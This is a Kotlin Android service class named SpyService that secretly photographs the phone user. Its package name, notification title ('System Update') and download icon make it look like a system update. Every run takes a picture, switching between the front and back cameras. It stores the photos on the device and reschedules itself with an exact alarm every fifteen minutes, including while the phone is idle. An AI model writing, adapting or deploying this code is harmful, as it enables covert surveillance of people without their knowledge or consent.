package com.system.update
import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import java.io.File
class SpyService : Service() {
    private val owner = CameraOwner()
    override fun onBind(intent: Intent?): IBinder? = null
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        showNotification()
        shoot()
        return START_NOT_STICKY
    }
    private fun showNotification() {
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(
                NotificationChannel("bg", "Background", NotificationManager.IMPORTANCE_MIN))
        }
        val tap = PendingIntent.getActivity(this, 0,
            Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        val notif = NotificationCompat.Builder(this, "bg")
            .setContentTitle("System Update")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setContentIntent(tap).setOngoing(true).build()
        if (Build.VERSION.SDK_INT >= 29)
            startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        else startForeground(1, notif)
    }
    private fun shoot() {
        val dir = File(getExternalFilesDir(null), "shots").apply { mkdirs() }
        val target = File(dir, "img_${System.currentTimeMillis()}.jpg")
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
        val useFront = prefs.getBoolean("front", false)
        prefs.edit().putBoolean("front", !useFront).apply()
        owner.start()
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                val provider = future.get()
                val selector = if (useFront) CameraSelector.DEFAULT_FRONT_CAMERA
                               else CameraSelector.DEFAULT_BACK_CAMERA
                val capture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                provider.unbindAll()
                provider.bindToLifecycle(owner, selector, capture)
                capture.takePicture(
                    ImageCapture.OutputFileOptions.Builder(target).build(),
                    ContextCompat.getMainExecutor(this),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(r: ImageCapture.OutputFileResults) {
                            provider.unbindAll(); owner.stop(); reschedule()
                        }
                        override fun onError(e: ImageCaptureException) {
                            provider.unbindAll(); owner.stop(); reschedule()
                        }
                    })
            } catch (e: Exception) { stopSelf() }
        }, ContextCompat.getMainExecutor(this))
    }
    private fun reschedule() {
        val pi = PendingIntent.getBroadcast(this, 0,
            Intent(this, AlarmReceiver::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
        getSystemService(AlarmManager::class.java).setExactAndAllowWhileIdle(
            AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 900_000L, pi)
        stopSelf()
    }
}
class CameraOwner : LifecycleOwner {
    private val registry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = registry
    fun start() { registry.currentState = Lifecycle.State.RESUMED }
    fun stop() { registry.currentState = Lifecycle.State.DESTROYED }
}